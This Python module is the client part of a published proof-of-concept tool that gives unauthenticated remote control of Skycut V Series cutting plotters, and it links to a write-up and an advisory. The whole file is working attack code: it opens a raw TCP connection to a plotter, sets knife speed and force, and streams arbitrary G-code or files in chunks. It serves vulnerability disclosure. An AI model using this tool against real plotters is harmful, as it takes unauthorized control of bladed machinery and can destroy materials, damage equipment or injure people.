# Module: plotter_client.py
# Part of the Skycut V Series Cutting Plotter Unauthenticated Remote Control
# Author: Omar Elshopky (omarelshopky.com)
#
# Full Write-up: https://medium.com/@omarelshopky/wireless-weapons-turning-skycut-plotters-into-physical-dangers-9f29e0cd357a
# Advisory: https://github.com/omarelshopky/skycut-v-series-cutting-plotter-unauth-remote-control-poc

import socket
from colorama import Fore
from config import DEFAULT_PORT, DEFAULT_EMPTY_RUN, DEFAULT_KNIFE_SPEED, DEFAULT_KNIFE_FORCE, MAX_PACKET_LENGTH, GCODES


class PlotterClient:
    def __init__(self, host, port=DEFAULT_PORT, empty_run=DEFAULT_EMPTY_RUN, knife_speed=DEFAULT_KNIFE_SPEED, knife_force=DEFAULT_KNIFE_FORCE):
        self.host = host
        self.port = port
        self.socket = None

        self.empty_run = empty_run
        self.knife_speed = knife_speed
        self.knife_force = knife_force

    def connect(self):
        print(Fore.CYAN + f"[*] Connecting to plotter at {self.host}:{self.port}...")
        try:
            self.socket = socket.create_connection((self.host, self.port), timeout=5)
            print(Fore.GREEN + "[+] Connection established")
            return True
        except Exception as e:
            print(Fore.RED + f"[-] Failed to connect: {e}")
            return False

    def set_config(self, empty_run=None, knife_speed=None, knife_force=None):
        if empty_run is not None:
            self.empty_run = empty_run
        if knife_speed is not None:
            self.knife_speed = knife_speed
        if knife_force is not None:
            self.knife_force = knife_force

    def send_gcode(self, command, value=None, raw_data=None):
        if command not in GCODES:
            print(Fore.YELLOW + f"[!] Unknown command: {command}")
            return

        # Chain configs before specific commands
        if command in ["TEST", "SEND_FILE"]:
            print(Fore.CYAN + "[*] Sending config commands before main command...")
            self.send_gcode("SET_EMPTY_RUN", self.empty_run)
            self.send_gcode("SET_KNIFE_SPEED", self.knife_speed)
            self.send_gcode("SET_KNIFE_FORCE", self.knife_force)

        # Special case for file sending
        if command == "SEND_FILE":
            if not raw_data:
                print(Fore.RED + "[-] SEND_FILE command requires raw_data")
                return
            self._send_in_packets(raw_data)
            return

        # Replace <VARIABLE> if needed
        gcode = GCODES[command]
        if "<VARIABLE>" in gcode:
            if value is None:
                print(Fore.YELLOW + f"[!] Command '{command}' requires a value")
                return
            gcode = gcode.replace("<VARIABLE>", str(value))

        self._send_in_packets(gcode)

    def _send_in_packets(self, gcode):
        try:
            for i in range(0, len(gcode), MAX_PACKET_LENGTH):
                chunk = gcode[i:i + MAX_PACKET_LENGTH]
                print(Fore.CYAN + f"[*] Sending chunk: {chunk}")
                self.socket.sendall(chunk.encode())
        except Exception as e:
            print(Fore.RED + f"[-] Error sending packet: {e}")

    def close(self):
        if self.socket:
            try:
                self.socket.close()
                print(Fore.CYAN + "[*] Connection closed")
            except Exception as e:
                print(Fore.RED + f"[-] Error closing socket: {e}")
